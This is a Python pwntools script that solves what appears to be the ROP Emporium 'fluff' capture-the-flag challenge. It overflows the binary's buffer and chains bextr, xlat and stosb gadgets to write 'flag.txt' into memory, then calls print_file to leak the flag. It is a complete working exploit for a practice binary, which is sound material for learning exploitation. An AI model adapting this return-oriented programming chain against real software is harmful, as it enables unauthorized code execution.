from pwn import *

def get_addr(addr):
    return addr - 0x3ef2

'''
f - 0x004003c1+3 - libfluff.so
l - 0x004003c1+0 - libfluff.so
a - 0x00400415+3 - _edata
g - 0x004003cd+1 - _gmon_start_
. - 0x004003c1+8 - libfluff.so
t - 0x00400415+4 - _edata
x - 0x004006c4+4 - nonexistent
t - 0x00400415+4 - _edata
'''

# Start the process
pr = process("./fluff")

# Addresses used for flag.txt string
flag = []
flag.append(get_addr(0x004003c1+3))
flag.append(get_addr(0x004003c1+0))
flag.append(get_addr(0x00400415+3))
flag.append(get_addr(0x004003cd+2))
flag.append(get_addr(0x004003c1+8))
flag.append(get_addr(0x00400415+4))
flag.append(get_addr(0x004006c4+4))
flag.append(get_addr(0x00400415+4))

# Gadgets used for rop
pop_rdi = p64(0x4006a3)
bextr = p64(0x40062a)
bextr_no_rdx = p64(0x40062b)
print_file = p64(0x400620)
data_addr = 0x00601028
stos = p64(0x400639)
xlat = p64(0x400628) 
zero_al_pop_rbp = p64(0x400610)
only_bextr = p64(0x400633)

# Put it all together
payload = "A"*40

payload += pop_rdi + p64(data_addr)
payload += zero_al_pop_rbp + "B"*8
payload += bextr + p64(0x3000) + p64(flag[0])
payload += xlat + stos 

for i in range(1,8):
    payload += zero_al_pop_rbp + "B"*8
    payload += bextr_no_rdx + p64(flag[i])
    payload += xlat + stos 

payload += pop_rdi + p64(data_addr) + print_file


# Send payload and pray
pr.sendline(payload)
print(pr.recvall())
